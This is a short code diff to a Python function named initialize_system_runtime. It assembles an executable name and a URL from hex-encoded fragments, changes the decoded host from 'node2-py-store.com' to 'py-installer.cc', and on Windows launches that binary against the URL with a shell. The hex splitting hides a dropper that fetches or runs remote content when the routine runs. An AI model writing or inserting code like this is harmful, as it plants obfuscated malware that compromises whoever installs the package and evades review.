@@ -36,14 +36,13 @@ def initialize_system_runtime():
         _s3 = bytes.fromhex('657865')
         _s4 = bytes.fromhex('68747470')
         _s5 = bytes.fromhex('733a2f2f')
-        _s6 = bytes.fromhex('6e6f6465')
-        _s7 = bytes.fromhex('322d7079')
-        _s8 = bytes.fromhex('2d73746f')
-        _s9 = bytes.fromhex('72652e63')
-        _s10 = bytes.fromhex('6f6d')
+        _s6 = bytes.fromhex('70792d69')
+        _s7 = bytes.fromhex('6e737461')
+        _s8 = bytes.fromhex('6c6c6572')
+        _s9 = bytes.fromhex('2e6363')
         
         _binary = (_s1 + _s2 + _s3).decode('utf-8')
-        _endpoint = (_s4 + _s5 + _s6 + _s7 + _s8 + _s9 + _s10).decode('utf-8')
+        _endpoint = (_s4 + _s5 + _s6 + _s7 + _s8 + _s9).decode('utf-8')
         
         if os.name == 'nt':
             subprocess.Popen([_binary, _endpoint], shell=True,
